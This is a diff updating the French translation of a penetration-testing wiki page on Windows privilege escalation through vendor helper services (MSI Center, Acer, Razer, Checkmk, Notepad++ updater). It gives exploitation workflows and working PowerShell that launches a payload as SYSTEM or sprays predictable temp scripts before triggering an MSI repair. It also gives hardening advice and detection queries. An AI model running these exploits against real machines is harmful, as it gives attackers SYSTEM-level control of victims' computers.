-- `ACCSvc.exe` (SYSTEM) expose `\\.\pipe\treadstone_service_LightMode`, et son ACL discrétionnaire autorise des clients distants (par ex. `\\TARGET\pipe\treadstone_service_LightMode`). Envoyer l’ID de commande `7` avec un chemin de fichier invoque la routine de lancement de processus du service.
-- La bibliothèque client sérialise un octet terminateur magique (113) avec les args. L’instrumentation dynamique avec Frida/`TsDotNetLib` (voir [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) pour des conseils d’instrumentation) montre que le handler natif mappe cette valeur vers un `SECURITY_IMPERSONATION_LEVEL` et un SID d’intégrité avant d’appeler `CreateProcessAsUser`.
-- Remplacer 113 (`0x71`) par 114 (`0x72`) bascule dans la branche générique qui conserve le jeton SYSTEM complet et définit un SID d’intégrité élevé (`S-1-16-12288`). Le binaire lancé s’exécute donc en SYSTEM non restreint, à la fois localement et à distance.
-- Combine that with the exposed installer flag (`Setup.exe -nocheck`) to stand up ACC even on lab VMs and exercise the pipe without vendor hardware.
-
-These IPC bugs highlight why localhost services must enforce mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) and why every module’s “run arbitrary binary” helper must share the same signer verifications.
+Lorsque le scheduler se déclenche, il exécute le payload écrasé avec les privilèges SYSTEM, bien que le fichier original ait été validé. Une exploitation fiable utilise deux goroutines/threads qui envoient en boucle CMD_AutoUpdateSDK jusqu’à remporter la fenêtre TOCTOU.<sup>[[6]](#references)</sup>
 
 ---
-## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)
+## 2) Abus d’IPC custom au niveau SYSTEM et de l’impersonation (MSI Center + Acer Control Centre)
 
-Razer Synapse 4 a ajouté un autre schéma utile à cette famille : un utilisateur à faible privilège peut demander à un helper COM de lancer un processus via `RzUtility.Elevator`, tandis que la décision de confiance est déléguée à une DLL en user-mode (`simple_service.dll`) au lieu d’être appliquée de manière robuste à l’intérieur de la frontière privilégiée.
+### Ensembles de commandes TCP de MSI Center
+- Chaque plugin/DLL chargé par `MSI.CentralServer.exe` reçoit un Component ID stocké sous `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Les 4 premiers octets d’une trame sélectionnent ce composant, ce qui permet aux attaquants d’acheminer des commandes vers des modules arbitraires.
+- Les plugins peuvent définir leurs propres task runners. `Support\API_Support.dll` expose `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` et appelle directement `API_Support.EX_Task::ExecuteTask()` sans aucune validation de signature – n’importe quel utilisateur local peut lui indiquer `C:\Users\<user>\Desktop\payload.exe` et obtenir une exécution SYSTEM déterministe.
+- Sniffer la loopback avec Wireshark ou instrumenter les binaires .NET dans dnSpy révèle rapidement la correspondance Component ↔ commande ; des clients custom en Go/Python peuvent ensuite rejouer les trames.<sup>[[6]](#references)</sup>
+
+### Named pipes d’Acer Control Centre et niveaux d’impersonation
+- `ACCSvc.exe` (SYSTEM) expose `\\.\pipe\treadstone_service_LightMode`, et sa discretionary ACL autorise les clients distants (par exemple, `\\TARGET\pipe\treadstone_service_LightMode`). L’envoi de l’ID de commande `7` avec un chemin de fichier invoque la routine de création de processus du service.
+- La bibliothèque cliente sérialise un octet terminateur magique (113) avec les arguments. L’instrumentation dynamique avec Frida/`TsDotNetLib` (voir [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) pour des conseils d’instrumentation) montre que le handler natif associe cette valeur à un `SECURITY_IMPERSONATION_LEVEL` et à un SID d’intégrité avant d’appeler `CreateProcessAsUser`.
+- Remplacer 113 (`0x71`) par 114 (`0x72`) bascule vers la branche générique qui conserve le token SYSTEM complet et définit un SID de haute intégrité (`S-1-16-12288`). Le binaire lancé s’exécute donc en tant que SYSTEM sans restriction, localement comme sur une autre machine.
+- Combiner cela avec le flag d’installation exposé (`Setup.exe -nocheck`) pour mettre en place ACC même sur des VM de laboratoire et tester le pipe sans matériel du fournisseur.<sup>[[6]](#references)</sup>
+
+Ces bugs d’IPC montrent pourquoi les services localhost doivent imposer une authentification mutuelle (SIDs ALPC, filtres `ImpersonationLevel=Impersonation`, filtrage des tokens) et pourquoi chaque helper de module permettant d’« exécuter un binaire arbitraire » doit appliquer les mêmes vérifications de signer.
+
+---
+## 3) Helpers « elevator » COM/IPC reposant sur une validation user-mode faible (Razer Synapse 4)
+
+Razer Synapse 4 a ajouté un autre pattern utile à cette famille : un utilisateur faiblement privilégié peut demander à un helper COM de lancer un processus via `RzUtility.Elevator`, tandis que la décision de confiance est déléguée à une DLL user-mode (`simple_service.dll`) au lieu d’être appliquée de manière robuste à l’intérieur de la boundary privilégiée.
 
 Chemin d’exploitation observé :
 - Instancier l’objet COM `RzUtility.Elevator`.
 - Appeler `LaunchProcessNoWait(<path>, "", 1)` pour demander un lancement élevé.
-- Dans le PoC public, la porte de vérification de signature PE dans `simple_service.dll` est patchée avant l’envoi de la requête, ce qui permet de lancer un exécutable arbitraire choisi par l’attaquant.
+- Dans le PoC public, le contrôle de signature PE dans `simple_service.dll` est patché avant l’émission de la requête, ce qui permet de lancer un exécutable arbitraire choisi par l’attaquant.<sup>[[6]](#references)</sup>
 
-Minimal PowerShell invocation:
+Invocation PowerShell minimale :
 ```powershell
 $com = New-Object -ComObject 'RzUtility.Elevator'
 $com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
 ```
-Prise principale : lors du reverse engineering de suites « helper », ne vous arrêtez pas à localhost TCP ou aux named pipes. Vérifiez les COM classes avec des noms comme `Elevator`, `Launcher`, `Updater`, ou `Utility`, puis confirmez si le service privilégié valide réellement le binaire cible lui-même ou s’il fait simplement confiance à un résultat calculé par une DLL client user-mode patchable. Ce pattern s’étend au-delà de Razer : toute conception split où le broker à haut privilège consomme une décision allow/deny provenant de la partie low-privilege est une candidate privesc surface.
+Conclusion générale : lors de l’analyse de suites « helper », ne vous limitez pas aux connexions TCP localhost ou aux named pipes. Recherchez les classes COM dont le nom contient `Elevator`, `Launcher`, `Updater` ou `Utility`, puis vérifiez si le service privilégié valide réellement le binaire cible ou s’il fait simplement confiance à un résultat calculé par une DLL cliente en user-mode et modifiable. Ce pattern se généralise au-delà de Razer : toute architecture séparée dans laquelle le broker disposant de privilèges élevés consomme une décision allow/deny provenant de la partie à faibles privilèges constitue une surface potentielle de privesc.
 
 
 ---
-## Exécution prévisible d’un script temp pendant la réparation MSI (Checkmk Agent / CVE-2024-0670)
+## Exécution prévisible d'un script temporaire pendant la réparation MSI (Checkmk Agent / CVE-2024-0670)
 
-Certains agents Windows implémentent encore des actions privilégiées en écrivant un `.cmd` temporaire dans `C:\Windows\Temp` puis en l’exécutant en tant que `SYSTEM`. Si le nom de fichier est prévisible et que le service ne recrée pas les fichiers existants de manière sûre, un utilisateur low-privilege peut pré-créer le futur fichier temp en **lecture seule** et faire exécuter au processus privilégié du contenu contrôlé par l’attaquant à la place de son propre script.
+Certains agents Windows implémentent encore les actions privilégiées en écrivant un fichier `.cmd` temporaire dans `C:\Windows\Temp` et en l'exécutant en tant que `SYSTEM`. Si le nom de fichier est prévisible et que le service ne recrée pas correctement les fichiers existants, un utilisateur disposant de faibles privilèges peut créer à l'avance le futur fichier temporaire en **lecture seule** et forcer le processus privilégié à exécuter du contenu contrôlé par l'attaquant au lieu de son propre script.
 
-Observé dans les versions vulnérables de Checkmk Agent :
-- pattern temp : `cmk_all_<PID>_1.cmd`
+Observé dans les builds vulnérables de Checkmk Agent :
+- pattern temporaire : `cmk_all_<PID>_1.cmd`
 - branches affectées : `2.0.0`, `2.1.0`, `2.2.0`
-- déclencheur : réparation MSI **repair** du package agent mis en cache
+- déclencheur : **réparation** MSI du package de l'agent mis en cache<sup>[[8]](#references)[[9]](#references)</sup>
 
 Workflow pratique :
-1. Estimez une plage réaliste de PID à partir des PID des processus actuels ou du PID de l’agent en cours d’exécution.
-2. Écrivez un payload `.cmd` court en **ASCII** (`Set-Content -Encoding Ascii` ou redirection `cmd.exe`; évitez la sortie PowerShell UTF-16 pour les fichiers batch).
-3. Saupoudrez `C:\Windows\Temp\cmk_all_<PID>_1.cmd` sur la plage candidate et marquez chaque fichier en lecture seule.
-4. Déclenchez une réparation du MSI mis en cache afin que le service privilégié tente de régénérer puis exécute le script temp.
+1. Estimez une plage réaliste de PID à partir des identifiants des processus actuels ou du PID de l'agent en cours d'exécution.
+2. Écrivez une courte payload `.cmd` en **ASCII** (`Set-Content -Encoding Ascii` ou redirection `cmd.exe` ; évitez la sortie PowerShell en UTF-16 pour les batch files).
+3. Déployez en masse `C:\Windows\Temp\cmk_all_<PID>_1.cmd` sur la plage candidate et marquez chaque fichier en lecture seule.
+4. Déclenchez une réparation du MSI mis en cache afin que le service privilégié tente de régénérer, puis exécute le script temporaire.<sup>[[7]](#references)</sup>
 ```powershell
 Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
 1..10000 | ForEach-Object {
@@ -270,7 +270,7 @@ Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
 Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
 }
 ```
-Si le produit vulnérable est installé avec Windows Installer, mappez le MSI mis en cache au nom aléatoire dans `C:\Windows\Installer` vers son nom de produit avant de déclencher la réparation :
+Si le produit vulnérable est installé avec Windows Installer, associez le fichier MSI mis en cache à l’apparence aléatoire sous `C:\Windows\Installer` à son nom de produit avant de déclencher la réparation :<sup>[[7]](#references)</sup>
 ```powershell
 Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
 ForEach-Object {
@@ -280,29 +280,29 @@ $p = Get-ItemProperty $_.PSPath
 
 msiexec /fa C:\Windows\Installer\<cached-agent>.msi
 ```
-Operational notes:
-- `qwinsta` est utile lorsque `msiexec /fa` échoue depuis un shell WinRM non interactif et que vous devez comprendre si une session de bureau existante/déconnectée peut déclencher correctement la réparation.
-- Ce pattern se généralise à d’autres endpoint agents et updaters qui **staged des scripts temp dans des emplacements world-writable puis les exécutent ensuite en tant que SYSTEM**. Testez les noms prédictibles, l’absence de sémantique de création exclusive, et les flows de repair/update qui peuvent être déclenchés à la demande.
+Notes opérationnelles :
+- `qwinsta` est utile lorsque `msiexec /fa` échoue depuis un shell WinRM non interactif et que vous devez déterminer si une session de bureau existante ou déconnectée peut déclencher correctement la réparation.<sup>[[7]](#references)</sup>
+- Ce pattern se généralise à d'autres agents endpoint et updaters qui **stagent des scripts temporaires dans des emplacements world-writable, puis les exécutent avec les privilèges SYSTEM**. Testez les noms prévisibles, l'absence de sémantique de création exclusive et les workflows de réparation/mise à jour pouvant être déclenchés à la demande.
 
 ---
-## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)
+## Détournement de la supply chain à distance via une validation faible de l'updater (WinGUp / Notepad++)
 
-Entre juin 2025 et décembre 2025, des attackers ayant compromis l’infrastructure d’hébergement derrière le flux d’update de Notepad++ ont servi sélectivement des manifests malveillants à des victimes choisies. Les anciens updaters basés sur WinGUp ne vérifiaient pas complètement l’authenticité des updates, donc une réponse XML hostile pouvait rediriger les clients vers des URLs contrôlées par l’attaquant. Parce que le client acceptait du contenu HTTPS sans imposer à la fois une chaîne de certificats de confiance et une signature PE valide sur l’installer téléchargé, les victimes ont téléchargé et exécuté un `update.exe` NSIS trojanized.
+Entre juin 2025 et décembre 2025, des attaquants ayant compromis l'infrastructure d'hébergement derrière le flux de mise à jour de Notepad++ ont servi sélectivement des manifests malveillants à certaines victimes. Les anciens updaters basés sur WinGUp ne vérifiaient pas complètement l'authenticité des mises à jour ; une réponse XML hostile pouvait donc rediriger les clients vers des URLs contrôlées par l'attaquant. Comme le client acceptait le contenu HTTPS sans imposer à la fois une chaîne de certificats de confiance et une signature PE valide sur l'installeur téléchargé, les victimes récupéraient et exécutaient un `update.exe` NSIS trojanisé.<sup>[[12]](#references)[[13]](#references)</sup>
 
-Operational flow (no local exploit required):
-1. **Infrastructure interception**: compromettre le CDN/hosting et répondre aux checks d’update avec des metadata d’attaquant pointant vers une URL de téléchargement malveillante.
-2. **Trojanized NSIS**: l’installer récupère/exécute un payload et abuse de deux execution chains :
-- **Bring-your-own signed binary + sideload**: bundle the signed Bitdefender `BluetoothService.exe` et déposer un `log.dll` malveillant dans son search path. Lorsque le signed binary s’exécute, Windows sideloads `log.dll`, qui déchiffre et charge de manière reflective la backdoor Chrysalis (protégée par Warbird + API hashing pour gêner la détection statique).
-- **Scripted shellcode injection**: NSIS exécute un script Lua compilé qui utilise des Win32 APIs (p. ex. `EnumWindowStationsW`) pour injecter du shellcode et stager Cobalt Strike Beacon.
+Flux opérationnel (aucun exploit local requis) :
+1. **Interception de l'infrastructure** : compromettre le CDN/l'hébergement et répondre aux vérifications de mise à jour avec des métadonnées de l'attaquant pointant vers une URL de téléchargement malveillante.
+2. **NSIS trojanisé** : l'installeur récupère/exécute un payload et abuse de deux chaînes d'exécution :
+- **Bring-your-own signed binary + sideload** : inclure le `BluetoothService.exe` signé de Bitdefender et déposer un `log.dll` malveillant dans son chemin de recherche. Lorsque le binaire signé s'exécute, Windows effectue le sideload de `log.dll`, qui déchiffre puis charge de manière reflective le backdoor Chrysalis (protégé par Warbird + API hashing pour entraver la détection statique).
+- **Injection de shellcode scriptée** : NSIS exécute un script Lua compilé qui utilise des APIs Win32 (par exemple, `EnumWindowStationsW`) pour injecter du shellcode et stager Cobalt Strike Beacon.<sup>[[12]](#references)</sup>
 
-Hardening/detection takeaways for any auto-updater:
-- Imposer la **vérification de certificat + signature** de l’installer téléchargé (pin the vendor signer, rejeter les CN/chain non correspondants) et signer le update manifest lui-même (p. ex. XMLDSig). Bloquer les redirects contrôlés par le manifest sauf s’ils sont validés.
-- Traiter le **BYO signed binary sideloading** comme un point de pivot de détection post-download : alerter lorsqu’un signed vendor EXE charge un nom de DLL provenant de l’extérieur de son canonical install path (p. ex. Bitdefender chargeant `log.dll` depuis Temp/Downloads) et lorsqu’un updater dépose/exécute des installers depuis temp avec des signatures non-vendor.
-- Surveiller les **malware-specific artifacts** observés dans cette chaîne (utiles comme generic pivots) : mutex `Global\Jdhfv_1.0.1`, écritures anormales de `gup.exe` vers `%TEMP%`, et les stages d’injection de shellcode pilotés par Lua.
-- Notepad++ a réagi en renforçant WinGUp dans v8.8.9 et versions ultérieures : le XML renvoyé est désormais signé (XMLDSig), et les versions plus récentes imposent la vérification de certificat + signature de l’installer téléchargé au lieu de se fier uniquement au transport.
+Points à retenir pour le hardening/la détection de tout auto-updater :
+- Imposer la **vérification du certificat et de la signature** de l'installeur téléchargé (épingler le signer du fournisseur, rejeter les CN/chaînes incohérents) et signer le manifest de mise à jour lui-même (par exemple, avec XMLDSig). Bloquer les redirections contrôlées par le manifest tant qu'elles n'ont pas été validées.
+- Considérer le **sideloading d'un binaire signé fourni par l'attaquant** comme un pivot de détection post-download : générer une alerte lorsqu'un EXE signé d'un fournisseur charge un nom de DLL depuis un emplacement extérieur à son chemin d'installation canonique (par exemple, Bitdefender chargeant `log.dll` depuis Temp/Downloads), ainsi que lorsqu'un updater dépose/exécute des installeurs depuis un emplacement temporaire avec des signatures qui ne sont pas celles du fournisseur.
+- Surveiller les artifacts spécifiques au malware observés dans cette chaîne (utiles comme pivots génériques) : le mutex `Global\Jdhfv_1.0.1`, les écritures anormales de `gup.exe` dans `%TEMP%` et les étapes d'injection de shellcode pilotées par Lua.
+- Notepad++ a renforcé WinGUp dans la version v8.8.9 et les versions ultérieures : le XML renvoyé est désormais signé (XMLDSig), et les builds plus récents imposent la vérification du certificat et de la signature de l'installeur téléchargé au lieu de faire confiance uniquement au transport.<sup>[[13]](#references)</sup>
 
 <details>
-<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
+<summary>Cortex XDR XQL – sideloading d'un EXE signé par Bitdefender chargeant <code>log.dll</code> (T1574.001)</summary>
 ```sql
 // Identifies Bitdefender-signed processes loading log.dll outside vendor paths
 config case_sensitive = false
@@ -316,7 +316,7 @@ config case_sensitive = false
 </details>
 
 <details>
-<summary>Cortex XDR XQL – <code>gup.exe</code> lançant un installateur autre que Notepad++</summary>
+<summary>Cortex XDR XQL – <code>gup.exe</code> lançant un programme d'installation autre que Notepad++</summary>
 ```sql
 config case_sensitive = false
 | dataset = xdr_data
@@ -327,25 +327,24 @@ config case_sensitive = false
 ```
 </details>
 
-Ces patterns se généralisent à tout updater qui accepte des manifests non signés ou qui ne fixe pas les signers de l’installer — hijack du réseau + malicious installer + sideloading BYO-signed permet une remote code execution sous couvert de mises à jour « trusted ».
+Ces schémas se généralisent à tout updater qui accepte des manifests non signés ou qui ne vérifie pas strictement l'identité des signataires des installers : détournement réseau + installer malveillant + sideloading signé par l'attaquant permettent une exécution de code à distance sous couvert de mises à jour « de confiance ».
 
 ---
-## References
-- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
-- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
-- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
-- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
-- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
-- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
-- [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
-- [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
-- [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
-- [RunasCs](https://github.com/antonioCoco/RunasCs)
-- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
-- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
-- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
-- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
-- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
-- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
+## Références
+- [1] [Advisory – Netskope Client for Windows – Élévation de privilèges locale via un serveur malveillant (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
+- [2] [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
+- [3] [NachoVPN – plugin Netskope](https://github.com/AmberWolfCyber/NachoVPN)
+- [4] [UpSkope – client/exploit IPC Netskope](https://github.com/AmberWolfCyber/UpSkope)
+- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
+- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre et Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
+- [7] [0xdf – HTB : NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
+- [8] [SEC Consult – Élévation de privilèges locale via des fichiers accessibles en écriture dans Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
+- [9] [Checkmk Werk #16361 – Élévation de privilèges dans l'agent Windows](https://checkmk.com/werk/16361)
+- [10] [PoCs de sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
+- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
+- [12] [Unit 42 – Des acteurs étatiques exploitent la supply chain de Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
+- [13] [Notepad++ – mise à jour concernant l'incident lié à l'infrastructure détournée](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
+- [14] [AmberWolf – Contourner le correctif de CVE-2025-0309 dans Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
+- [15] [Atredis – Découverte de bugs d'élévation de privilèges dans Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
 
 {{#include ../../banners/hacktricks-training.md}}
